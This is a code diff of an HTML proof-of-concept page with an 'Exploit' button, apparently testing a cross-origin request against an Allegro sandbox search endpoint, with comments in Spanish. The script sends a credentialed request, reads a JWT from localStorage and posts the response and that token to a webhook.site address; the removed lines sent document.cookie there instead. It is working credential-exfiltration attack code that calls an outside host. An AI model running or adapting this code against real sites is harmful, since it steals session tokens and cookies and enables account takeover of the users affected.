@@ -8,19 +8,28 @@
     <button id="exploit">Exploit</button>
     <script>
         document.getElementById("exploit").addEventListener("click", () => {
+            const token = localStorage.getItem("authToken"); // Usar un token JWT guardado en localStorage
+
             fetch("https://allegro.cz.allegrosandbox.pl/vyhledavani?string=test", {
-                method: "GET",
-                credentials: "include" // Incluye cookies o credenciales si el usuario está autenticado
+                method: "POST",
+                credentials: "include", // Si se requieren cookies también
+                headers: {
+                    "Content-Type": "application/json",
+                    "Authorization": `Bearer ${token}`, // Agregar token JWT si está disponible
+                    "X-Custom-Header": "MyCustomValue" // Ejemplo de encabezado personalizado
+                },
+                body: JSON.stringify({
+                    key: "value", // Aquí puedes enviar datos en el cuerpo de la solicitud
+                })
             })
             .then(response => response.text())
             .then(data => {
-                // Envía la respuesta y las cookies al Webhook.site
                 fetch("https://webhook.site/7cbf4d39-ff45-4958-affd-0ff7435dceb6", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ 
                         response: data,
-                        cookies: document.cookie // Aquí se incluye las cookies
+                        token: token // Enviar también el token como parte de la respuesta
                     })
                 });
             })
